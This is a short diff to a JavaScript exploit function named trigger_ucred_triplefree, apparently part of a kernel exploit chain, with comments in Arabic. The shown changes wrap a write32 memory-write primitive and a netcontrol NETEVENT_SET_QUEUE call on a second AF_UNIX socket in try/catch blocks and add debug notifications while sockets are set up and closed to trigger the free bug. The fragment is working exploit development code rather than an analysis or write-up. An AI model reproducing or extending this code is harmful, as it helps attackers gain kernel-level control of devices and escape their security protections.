@@ -1461,10 +1461,24 @@ function trigger_ucred_triplefree() {
         var s2 = socket(AF_UNIX, SOCK_STREAM, 0);
         send_notification("[2] second socket FD = " + s2 + " (diff from dummy = " + (s2 - dummy_socket) + ")");
 
-        write32(nc_set_buf, Number(s2.and(0xFFFFFFFF)));
-        var r2 = netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
-        send_notification("[2] netcontrol(SET_QUEUE second) ret = " + r2);
+        // 5) تسجيل السوكت التاني في الـ queue – تتبع أدق
+        send_notification("[2] about to write32 for second socket");
 
+        try {
+            write32(nc_set_buf, Number(s2.and(0xFFFFFFFF)));
+            send_notification("[2] write32 for second socket done");
+        } catch (e) {
+            send_notification("[2] write32 second socket EXCEPTION: " + e);
+        }
+
+        send_notification("[2] about to netcontrol second socket");
+
+        try {
+            var r2 = netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
+            send_notification("[2] netcontrol(SET_QUEUE second) ret = " + r2);
+        } catch (e) {
+            send_notification("[2] netcontrol second socket EXCEPTION: " + e);
+        }
         // 6) قفل السوكتين بسرعة لكن بأمان
         try {
             close(new BigInt(dummy_socket));
